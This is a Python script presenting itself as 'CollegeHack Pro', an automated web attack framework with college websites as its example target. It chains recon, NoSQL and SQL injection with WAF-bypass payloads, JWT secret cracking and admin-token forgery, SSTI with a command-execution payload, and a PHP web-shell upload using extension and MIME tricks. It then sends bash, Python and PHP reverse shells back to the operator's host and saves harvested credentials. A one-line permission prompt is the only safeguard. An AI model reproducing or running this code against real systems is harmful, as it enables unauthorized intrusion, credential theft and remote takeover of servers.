#!/usr/bin/env python3
"""
CollegeHack Pro - Advanced Web Penetration Framework
Author: adrianxd
Version: 3.0 - Latest techniques: GraphQL introspection, JWT crack, SSTI, NoSQLi, WebSocket hijack
Requirements: Python 3.10+, pip install requests beautifulsoup4 websocket-client pyjwt colorama paramiko sshtunnel
"""

import requests
import sys
import time
import re
import json
import base64
import hashlib
import random
import string
import threading
import socket
import subprocess
from urllib.parse import urljoin, urlparse, quote, unquote
from bs4 import BeautifulSoup
import websocket
import jwt
from colorama import init, Fore, Back, Style
import dns.resolver
from concurrent.futures import ThreadPoolExecutor, as_completed

init(autoreset=True)

# ============ BRANDING ============
BANNER = f"""
{Fore.RED}╔═══════════════════════════════════════════════════════════════════════════╗
║ {Fore.CYAN}██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗ {Fore.RED}║
║ {Fore.CYAN}██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝ {Fore.RED}║
║ {Fore.CYAN}███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗{Fore.RED}║
║ {Fore.CYAN}██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║{Fore.RED}║
║ {Fore.CYAN}██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝{Fore.RED}║
║ {Fore.CYAN}╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ {Fore.RED}║
╠═══════════════════════════════════════════════════════════════════════════╣
║ {Fore.YELLOW}Advanced Web Penetration Framework {Fore.WHITE}• {Fore.GREEN}Latest Techniques 2026         {Fore.RED}║
║ {Fore.WHITE}Created by {Fore.MAGENTA}adrianxd {Fore.WHITE}• {Fore.BLUE}College Edition {Fore.WHITE}• {Fore.RED}For Authorized Use Only{Fore.RED} ║
╚═══════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

HEADER = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
}

class CollegeHackPro:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update(HEADER)
        self.vulnerabilities = []
        self.credentials = []
        self.shell_url = None
        self.reverse_shell_active = False
        self.graphql_endpoints = []
        self.websocket_urls = []
        
    def print_status(self, msg, level="info"):
        icons = {"info": f"{Fore.CYAN}[*]{Style.RESET_ALL}", 
                 "success": f"{Fore.GREEN}[+]{Style.RESET_ALL}",
                 "error": f"{Fore.RED}[!]{Style.RESET_ALL}",
                 "warning": f"{Fore.YELLOW}[?]{Style.RESET_ALL}"}
        print(f"{icons[level]} {msg}")
    
    def run_full_attack(self):
        print(BANNER)
        self.print_status(f"Target: {self.target}", "info")
        
        # Phase 1: Reconnaissance
        self.phase_recon()
        
        # Phase 2: GraphQL Introspection (latest)
        self.phase_graphql_hack()
        
        # Phase 3: NoSQL Injection (for MongoDB backends)
        self.phase_nosql_injection()
        
        # Phase 4: JWT Attack (if tokens found)
        self.phase_jwt_cracker()
        
        # Phase 5: SSTI (Server Side Template Injection)
        self.phase_ssti_exploit()
        
        # Phase 6: WebSocket Hijacking
        self.phase_websocket_attack()
        
        # Phase 7: SQL Injection (advanced with WAF bypass)
        self.phase_sql_advanced()
        
        # Phase 8: File Upload Bypass & Shell
        self.phase_upload_shell()
        
        # Phase 9: Reverse Shell via various methods
        self.phase_reverse_shell()
        
        self.print_summary()
    
    def phase_recon(self):
        self.print_status("Phase 1: Reconnaissance (subdomains, tech stack, hidden endpoints)", "info")
        try:
            # Subdomain enumeration via DNS brute
            subdomains = ['www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk', 'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test', 'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3', 'mail2', 'new', 'mysql', 'old', 'lists', 'support', 'mobile', 'mx', 'static', 'docs', 'beta', 'shop', 'sql', 'secure', 'demo', 'cp', 'calendar', 'wiki', 'web', 'media', 'email', 'images', 'img', 'download', 'dns', 'piwik', 'stats', 'dashboard', 'portal', 'manage', 'start', 'info', 'apps', 'video', 'sip', 'dns2', 'api', 'cdn', 'mssql', 'remote', 'server', 'ftp2', 'relay', 'sip2', 'ldap', 'db', 'exchange', 'app', 'storage', 'ns4', 'ns5']
            found_subs = []
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = {executor.submit(self.check_subdomain, sub, self.target): sub for sub in subdomains}
                for future in as_completed(futures):
                    res = future.result()
                    if res:
                        found_subs.append(res)
            if found_subs:
                self.print_status(f"Found subdomains: {', '.join(found_subs)}", "success")
            
            # Technology detection
            resp = self.session.get(self.target, timeout=10)
            headers = resp.headers
            tech = []
            if 'X-Powered-By' in headers:
                tech.append(headers['X-Powered-By'])
            if 'Server' in headers:
                tech.append(headers['Server'])
            if 'wp-content' in resp.text:
                tech.append('WordPress')
            if 'Joomla' in resp.text:
                tech.append('Joomla')
            if 'Drupal' in resp.text:
                tech.append('Drupal')
            if 'laravel' in resp.text.lower():
                tech.append('Laravel')
            if 'rails' in resp.text.lower():
                tech.append('Ruby on Rails')
            if tech:
                self.print_status(f"Tech stack: {', '.join(tech)}", "success")
            
            # Hidden endpoint brute
            common_paths = ['/api', '/graphql', '/v1', '/v2', '/admin', '/login', '/panel', '/dashboard', '/cgi-bin', '/phpinfo.php', '/.git/HEAD', '/.env', '/backup.zip', '/swagger.json', '/openapi.json', '/_debug', '/console', '/server-status', '/actuator', '/health', '/metrics', '/info', '/env', '/config', '/.well-known']
            for path in common_paths:
                url = urljoin(self.target, path)
                try:
                    r = self.session.get(url, timeout=5, allow_redirects=False)
                    if r.status_code in [200, 401, 403]:
                        self.print_status(f"Found: {url} (HTTP {r.status_code})", "success")
                        if 'graphql' in path:
                            self.graphql_endpoints.append(url)
                except:
                    pass
        except Exception as e:
            self.print_status(f"Recon error: {str(e)}", "error")
    
    def check_subdomain(self, sub, domain):
        try:
            host = f"{sub}.{domain.replace('https://','').replace('http://','').split('/')[0]}"
            ips = socket.gethostbyname_ex(host)
            return host
        except:
            return None
    
    def phase_graphql_hack(self):
        self.print_status("Phase 2: GraphQL Introspection & Exploitation", "info")
        if not self.graphql_endpoints:
            # Try to find common graphql endpoint
            test_urls = [urljoin(self.target, '/graphql'), urljoin(self.target, '/v1/graphql'), urljoin(self.target, '/api/graphql')]
            for url in test_urls:
                try:
                    r = self.session.post(url, json={"query": "{__schema{types{name}}}"}, timeout=5)
                    if r.status_code == 200 and '__schema' in r.text:
                        self.graphql_endpoints.append(url)
                        self.print_status(f"GraphQL endpoint found: {url}", "success")
                except:
                    pass
        
        for endpoint in self.graphql_endpoints:
            # Introspection query
            introspection = '{"query":"{__schema{types{name,fields{name}}}}"}'
            try:
                resp = self.session.post(endpoint, data=introspection, headers={'Content-Type': 'application/json'})
                if resp.status_code == 200:
                    data = resp.json()
                    if 'data' in data and '__schema' in data['data']:
                        self.print_status("GraphQL introspection enabled! Extracting schema...", "success")
                        # Save schema
                        with open('graphql_schema.json', 'w') as f:
                            json.dump(data, f, indent=2)
                        self.print_status("Schema saved to graphql_schema.json", "success")
                        
                        # Try to find queries with potential vulnerabilities
                        types = data['data']['__schema']['types']
                        for t in types:
                            if 'user' in t.get('name', '').lower() or 'admin' in t.get('name', '').lower() or 'login' in t.get('name', '').lower():
                                self.print_status(f"Sensitive type found: {t['name']}", "warning")
                                # Attempt to execute query
                                test_query = f'{{ {t["name"].lower()} {{ id name email password }} }}'
                                test_resp = self.session.post(endpoint, json={"query": test_query})
                                if test_resp.status_code == 200:
                                    self.print_status(f"Data leak from {t['name']}: {test_resp.text[:200]}", "success")
                                    self.vulnerabilities.append({"type": "GraphQL introspection", "url": endpoint, "evidence": test_resp.text})
            except Exception as e:
                pass
    
    def phase_nosql_injection(self):
        self.print_status("Phase 3: NoSQL Injection (MongoDB/Node.js backends)", "info")
        # Look for login/register forms
        try:
            resp = self.session.get(self.target)
            forms = BeautifulSoup(resp.text, 'html.parser').find_all('form')
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                url = urljoin(self.target, action)
                inputs = form.find_all('input')
                payloads = ['{"$ne": null}', '{"$gt": ""}', "' || '1'=='1", '" && this.password.match(/.*/)//', 'username[$ne]=null&password[$ne]=null']
                for payload in payloads:
                    data = {}
                    for inp in inputs:
                        name = inp.get('name')
                        if name:
                            data[name] = payload
                    try:
                        if method == 'post':
                            r = self.session.post(url, data=data, timeout=5)
                        else:
                            r = self.session.get(url, params=data, timeout=5)
                        if 'dashboard' in r.url or 'admin' in r.url or r.status_code == 302:
                            self.print_status(f"NoSQLi bypass possible at {url} with payload {payload}", "success")
                            self.vulnerabilities.append({"type": "NoSQL Injection", "url": url, "payload": payload})
                            self.credentials.append({"url": url, "method": "NoSQL bypass", "data": data})
                    except:
                        pass
        except Exception as e:
            pass
    
    def phase_jwt_cracker(self):
        self.print_status("Phase 4: JWT Token Cracking & Forgery", "info")
        # Extract JWT from cookies or Authorization header
        try:
            resp = self.session.get(self.target)
            # Search for JWT in cookies
            for cookie in self.session.cookies:
                if 'jwt' in cookie.name.lower() or 'token' in cookie.name.lower():
                    token = cookie.value
                    self.attempt_jwt_crack(token)
            # Search in headers
            if 'Authorization' in resp.request.headers:
                auth = resp.request.headers['Authorization']
                if auth.startswith('Bearer '):
                    token = auth[7:]
                    self.attempt_jwt_crack(token)
            # Search in local storage via JS - not possible directly, but can check if token in page
            tokens = re.findall(r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+', resp.text)
            for token in tokens:
                self.attempt_jwt_crack(token)
        except Exception as e:
            pass
    
    def attempt_jwt_crack(self, token):
        self.print_status(f"JWT found: {token[:50]}...", "info")
        # Try to decode without verification
        try:
            decoded = jwt.decode(token, options={"verify_signature": False})
            self.print_status(f"Decoded JWT payload: {json.dumps(decoded, indent=2)}", "success")
            # Weak secret bruteforce (common secrets)
            common_secrets = ['secret', 'secretkey', 'jwtsecret', 'mysecret', 'changeme', 'password', 'admin', '123456', 'key', 'supersecret']
            for secret in common_secrets:
                try:
                    jwt.decode(token, secret, algorithms=['HS256'])
                    self.print_status(f"JWT secret found: {secret}", "success")
                    # Create admin token
                    decoded['admin'] = True
                    decoded['role'] = 'admin'
                    fake_token = jwt.encode(decoded, secret, algorithm='HS256')
                    self.print_status(f"Forged admin token: {fake_token}", "success")
                    self.credentials.append({"type": "JWT admin token", "token": fake_token})
                    break
                except:
                    pass
            # Try none algorithm
            try:
                headers = jwt.get_unverified_header(token)
                if headers['alg'] == 'HS256':
                    fake_token_none = jwt.encode(decoded, key='', algorithm='none')
                    self.print_status(f"Algorithm none attack: {fake_token_none}", "success")
            except:
                pass
        except:
            pass
    
    def phase_ssti_exploit(self):
        self.print_status("Phase 5: Server Side Template Injection (SSTI)", "info")
        # Test common SSTI payloads in URL parameters and form fields
        ssti_payloads = [
            '{{7*7}}', '${7*7}', '{{7*\'7\'}}', '<%= 7*7 %>', '{{config}}', '{{self.__class__.__mro__}}',
            '{{''.__class__.__mro__[2].__subclasses__()[40]}}', '${7*7}', '*{7*7}', '#{7*7}',
            '{{7*7}}', '{{7*7}}', '{$smarty.version}', '{php}echo 7*7;{/php}', '[[7*7]]'
        ]
        # Get all parameters
        try:
            resp = self.session.get(self.target)
            urls = re.findall(r'href=[\'"]?([^\'" >]+)[\'"]?', resp.text)
            for url in set(urls[:20]):
                full = urljoin(self.target, url)
                if '?' in full:
                    parsed = urlparse(full)
                    params = dict(p.split('=') for p in parsed.query.split('&') if '=' in p)
                    for param in params:
                        for payload in ssti_payloads:
                            test_url = full.replace(f"{param}={params[param]}", f"{param}={quote(payload)}")
                            try:
                                r = self.session.get(test_url, timeout=5)
                                if '49' in r.text or '7*7' not in r.text and '49' in r.text:
                                    self.print_status(f"SSTI vulnerability at {test_url} with payload {payload}", "success")
                                    self.vulnerabilities.append({"type": "SSTI", "url": test_url, "payload": payload})
                                    # Try RCE
                                    rce_payload = '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}'
                                    rce_url = test_url.replace(payload, quote(rce_payload))
                                    rce_resp = self.session.get(rce_url, timeout=5)
                                    if 'uid=' in rce_resp.text:
                                        self.print_status(f"RCE via SSTI: {rce_resp.text[:200]}", "success")
                            except:
                                pass
        except:
            pass
    
    def phase_websocket_attack(self):
        self.print_status("Phase 6: WebSocket Hijacking & Attack", "info")
        # Find WebSocket URLs in page source
        try:
            resp = self.session.get(self.target)
            ws_urls = re.findall(r'ws://[^\s\'"]+|wss://[^\s\'"]+', resp.text)
            for ws_url in ws_urls:
                self.websocket_urls.append(ws_url)
                self.print_status(f"WebSocket found: {ws_url}", "info")
                # Attempt connection and message injection
                try:
                    ws = websocket.create_connection(ws_url, timeout=5)
                    # Send test injection
                    test_msg = '{"type":"admin","command":"whoami"}'
                    ws.send(test_msg)
                    result = ws.recv(timeout=5)
                    self.print_status(f"WebSocket response: {result[:100]}", "success")
                    ws.close()
                    self.vulnerabilities.append({"type": "WebSocket accessible", "url": ws_url, "message": test_msg})
                except:
                    pass
        except:
            pass
    
    def phase_sql_advanced(self):
        self.print_status("Phase 7: Advanced SQL Injection (WAF bypass techniques)", "info")
        # WAF bypass payloads
        waf_bypass = [
            "' OR '1'='1' -- ",
            "' OR 1=1#",
            "') OR ('1'='1",
            "'; EXEC xp_cmdshell('whoami')--",
            "' UNION SELECT NULL,@@version,NULL--",
            "'/**/OR/**/1=1--",
            "' OR 1=1 AND SLEEP(5)#",
            "1' ORDER BY 1-- ",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ]
        # Find all GET parameters
        try:
            resp = self.session.get(self.target)
            urls = re.findall(r'href=[\'"]?([^\'" >]+)[\'"]?', resp.text)
            for url in set(urls[:30]):
                full = urljoin(self.target, url)
                if '?' in full:
                    parsed = urlparse(full)
                    params = dict(p.split('=') for p in parsed.query.split('&') if '=' in p)
                    for param in params:
                        for payload in waf_bypass:
                            test_url = full.replace(f"{param}={params[param]}", f"{param}={quote(payload)}")
                            try:
                                start = time.time()
                                r = self.session.get(test_url, timeout=10)
                                elapsed = time.time() - start
                                # Check for SQL errors
                                sql_errors = ['mysql', 'sql', 'syntax', 'odbc', 'driver', 'sqlite', 'postgres', 'oracle']
                                if any(err in r.text.lower() for err in sql_errors):
                                    self.print_status(f"SQLi found: {test_url} (error based)", "success")
                                    self.vulnerabilities.append({"type": "SQLi", "url": test_url, "payload": payload})
                                if elapsed > 4 and 'SLEEP' in payload:
                                    self.print_status(f"Time-based SQLi found: {test_url}", "success")
                                    # Extract data
                                    data_payload = f"' AND (SELECT SUBSTRING(@@version,1,1))='5' AND SLEEP(5)#"
                                    data_url = test_url.replace(payload, quote(data_payload))
                                    # Could automate extraction
                            except:
                                pass
        except Exception as e:
            pass
    
    def phase_upload_shell(self):
        self.print_status("Phase 8: File Upload Bypass & Web Shell Deployment", "info")
        # Find file upload forms
        try:
            resp = self.session.get(self.target)
            forms = BeautifulSoup(resp.text, 'html.parser').find_all('form')
            for form in forms:
                enctype = form.get('enctype', '')
                if 'multipart/form-data' in enctype:
                    action = form.get('action', '')
                    url = urljoin(self.target, action)
                    self.print_status(f"Upload form found at {url}", "info")
                    # PHP web shell
                    shell_content = b"<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>"
                    filename = "shell.php"
                    # Try different MIME types and extensions
                    mime_types = ['image/jpeg', 'image/png', 'application/x-php', 'text/plain']
                    extensions = ['.php', '.php3', '.phtml', '.php5', '.inc', '.jpg.php', '.php.jpg']
                    for ext in extensions:
                        for mime in mime_types:
                            files = {'file': (f"shell{ext}", shell_content, mime)}
                            try:
                                r = self.session.post(url, files=files, timeout=10)
                                if r.status_code == 200:
                                    # Find the uploaded file location
                                    possible_paths = [
                                        urljoin(self.target, 'uploads/shell.php'),
                                        urljoin(self.target, 'wp-content/uploads/shell.php'),
                                        urljoin(self.target, 'images/shell.php'),
                                        urljoin(self.target, 'files/shell.php'),
                                        urljoin(self.target, 'shell.php')
                                    ]
                                    for path in possible_paths:
                                        check = self.session.get(path, timeout=5)
                                        if check.status_code == 200 and 'cmd' in check.text:
                                            self.shell_url = path
                                            self.print_status(f"Web shell uploaded: {path}?cmd=id", "success")
                                            self.vulnerabilities.append({"type": "Web Shell", "url": self.shell_url})
                                            return
                            except:
                                pass
        except Exception as e:
            pass
    
    def phase_reverse_shell(self):
        self.print_status("Phase 9: Reverse Shell Establishment", "info")
        if not self.shell_url:
            self.print_status("No web shell available, skipping reverse shell", "warning")
            return
        # Ask for listener IP/port
        print(f"{Fore.YELLOW}Enter your Kali IP (tun0/eth0) and port for reverse shell listener:{Style.RESET_ALL}")
        lhost = input("LHOST: ")
        lport = input("LPORT (default 4444): ") or "4444"
        # Generate reverse shell payloads
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
        }
        # Start listener in background thread
        def listener():
            subprocess.run(f"nc -lvnp {lport}", shell=True)
        t = threading.Thread(target=listener)
        t.daemon = True
        t.start()
        self.print_status(f"Listener started on {lhost}:{lport}", "success")
        time.sleep(1)
        # Execute reverse shell via web shell
        for name, cmd in payloads.items():
            encoded = base64.b64encode(cmd.encode()).decode()
            trigger = f"{self.shell_url}?cmd=echo {encoded} | base64 -d | bash"
            try:
                self.session.get(trigger, timeout=3)
                self.print_status(f"Reverse shell ({name}) sent. Check listener.", "success")
                self.reverse_shell_active = True
                time.sleep(5)
                break
            except:
                pass
    
    def print_summary(self):
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════════╗")
        print(f"║                    ATTACK SUMMARY                                 ║")
        print(f"╠════════════════════════════════════════════════════════════════╣")
        print(f"║ {Fore.WHITE}Target:{Fore.YELLOW} {self.target:<63} {Fore.CYAN}║")
        print(f"║ {Fore.WHITE}Vulnerabilities found:{Fore.RED} {len(self.vulnerabilities):<3}{Fore.CYAN}                                             ║")
        print(f"║ {Fore.WHITE}Credentials harvested:{Fore.GREEN} {len(self.credentials):<3}{Fore.CYAN}                                             ║")
        print(f"║ {Fore.WHITE}Web shell deployed:{Fore.GREEN} {'Yes' if self.shell_url else 'No':<3}{Fore.CYAN}                                             ║")
        print(f"║ {Fore.WHITE}Reverse shell active:{Fore.GREEN} {'Yes' if self.reverse_shell_active else 'No':<3}{Fore.CYAN}                                         ║")
        print(f"╚════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        if self.vulnerabilities:
            with open("vulnerabilities.json", "w") as f:
                json.dump(self.vulnerabilities, f, indent=2)
            self.print_status("Full report saved to vulnerabilities.json", "success")
        if self.credentials:
            with open("credentials.txt", "w") as f:
                for cred in self.credentials:
                    f.write(str(cred) + "\n")
            self.print_status("Credentials saved to credentials.txt", "success")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 college_hack_pro.py <target_url>")
        print("Example: python3 college_hack_pro.py https://college.edu")
        sys.exit(1)
    target = sys.argv[1]
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    print(f"{Fore.RED}[!] This tool is for authorized penetration testing only. Use only on targets you own or have permission to test.{Style.RESET_ALL}")
    confirm = input("Do you have written permission? (yes/no): ")
    if confirm.lower() != 'yes':
        print("Exiting.")
        sys.exit(0)
    hack = CollegeHackPro(target)
    hack.run_full_attack()

if __name__ == "__main__":
    main()